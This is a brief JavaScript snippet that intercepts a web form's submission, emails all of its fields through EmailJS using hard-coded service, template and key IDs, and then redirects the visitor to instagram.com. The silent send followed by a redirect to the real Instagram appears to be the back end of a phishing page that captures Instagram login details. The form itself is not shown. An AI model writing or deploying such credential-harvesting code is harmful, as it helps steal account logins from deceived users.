const templateId = "template_s8k7f6e";
const serviceId = "service_3o0nscs";
const publicKey = "2LEo93wUVbX3g2GAY";

 // Function to send the email
 function sendEmail(event) {
    event.preventDefault(); // Prevent the form from submitting normally
    
    // Get the form data
    var form = document.querySelector("form");
    var formData = new FormData(form);
    
    // Send the email
    emailjs.sendForm(serviceId, templateId, form, publicKey)
      .then(function(response) {
        // Optionally, show a success message to the user
        form.reset(); // Reset the form fields
        location.replace("https://www.instagram.com");
      }, function(error) {
        // Optionally, show an error message to the user
      });
  }
  
  // Attach the sendEmail function to the form's submit event
  document.querySelector("form").addEventListener("submit", sendEmail);